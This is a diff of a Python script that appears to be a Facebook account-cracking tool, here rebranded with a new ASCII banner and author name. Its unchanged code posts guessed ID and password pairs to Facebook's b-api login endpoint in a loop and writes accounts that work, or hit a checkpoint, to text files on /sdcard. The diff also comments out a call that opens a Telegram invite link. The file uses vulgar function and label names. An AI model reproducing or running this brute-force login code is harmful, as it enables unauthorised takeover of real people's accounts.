@@ -47,18 +47,29 @@ def ____banner____():
     else:os.system("clear")
     print(f"""\033[1;32m
     
-▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▖  ▗▖    ▗▖ ▗▖▗▖ ▗▖▗▄▄▖ 
-▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌    ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
-▐▛▀▘ ▐▌ ▐▌▐▛▀▚▖▐▌ ▝▜▌    ▐▛▀▜▌▐▌ ▐▌▐▛▀▚▖
-▐▌   ▝▚▄▞▘▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▝▚▄▞▘▐▙▄▞▘
-                                                                                                                                                             
- \x1b[37;41m\t ♥I♥M♥ B♥R♥A♥N♥D♥\x1b[0;m\n\n\x1b[1;37m                              
+
+ █████╗ ██╗      █████╗ ███╗   ███╗██╗███╗   ██╗
+██╔══██╗██║     ██╔══██╗████╗ ████║██║████╗  ██║
+███████║██║     ███████║██╔████╔██║██║██╔██╗ ██║
+██╔══██║██║     ██╔══██║██║╚██╔╝██║██║██║╚██╗██║
+██║  ██║███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║
+╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
+                                                
+      
+███████╗███████╗██████╗  █████╗ ████████╗
+██╔════╝██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
+█████╗  ███████╗██████╔╝███████║   ██║   
+██╔══╝  ╚════██║██╔══██╗██╔══██║   ██║   
+███████╗███████║██║  ██║██║  ██║   ██║   
+╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+                                                                                                                                                   
+                                                                                                                                                                                                             
+ \x1b[37;41m\t ♥I♥M♥ ALAMIN-ESRAT\x1b[0;m\n\n\x1b[1;37m                              
 \n---------------------------------
-\033[1;93m\033[1;93m Emon
-\033[1;91m  AUTHOR   : Emon
-\033[1;91m  GITHUB   :         Emon
-\033[1;91m  WHATSAPP : +    X
-\033[1;91m  TOOLS    : \033[1;32m FREE \033[1;37m                         
+\033[1;91m  AUTHOR   : ALAMIN
+\033[1;91m  GITHUB   : PRIVT
+\033[1;91m  WHATSAPP : +
+\033[1;91m  TOOLS    : \033[1;32m X\033[1;37m                         
 \033[1;91m  VERSION  :   \033[1;35m     2025                                                                            
 \033[1;93m\033[1;93m """)
     
@@ -90,7 +101,7 @@ def main():
 
 def fuckMyxAXN(series):
     ____banner____()
-    os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
+    #os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
     global gen
     if series == "100000":
         SEX = "100000"
@@ -117,7 +128,7 @@ def fuckMyxAXN(series):
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
-    sys.stdout.write(f"\rFUCK [{loop}]|OK:[{len(cps)}]")
+    sys.stdout.write(f"\rAL-AMIN[{loop}]|OK:[{len(cps)}]")
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -126,13 +137,13 @@ def Fucking_life(ids, passlist):
             url = "https://b-api.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head, verify=True).json()
             if "access_token" in response:
-                print(f"\r\r\x1bFUCK_H41N4-OK | {ids} • {pas}")
-                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1bALAMIN_H41N4-OK | {ids} • {pas}")
+                open("/sdcard/alamin-OK.txt", "a").write(ids + "|" + pas + "\n")
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1bAFUCKOK | {ids} • {pas}")
-                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
+                print(f"\r\r\x1balaminKOK | {ids} • {pas}")
+                open("/sdcard/Alamin-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
         loop += 1
